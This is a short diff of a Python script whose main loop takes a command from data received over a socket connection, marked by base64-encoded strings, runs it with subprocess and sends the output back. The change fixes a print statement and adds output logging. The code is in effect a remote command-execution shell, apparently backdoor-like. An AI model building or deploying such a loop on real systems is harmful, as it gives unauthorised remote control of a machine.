@@ -21,8 +21,9 @@ def main():
                 raw_command = str(data).split('Y29tbWFuZA==')[1]
                 print(raw_command)
                 command = raw_command.split(' ')
-                print('executing: ' + command)
+                print('executing: ' + raw_command)
                 output = subprocess.check_output(command)
+                print(output)
                 conn.send('b3V0cHV0Cg==' + output)
                 return
             else:
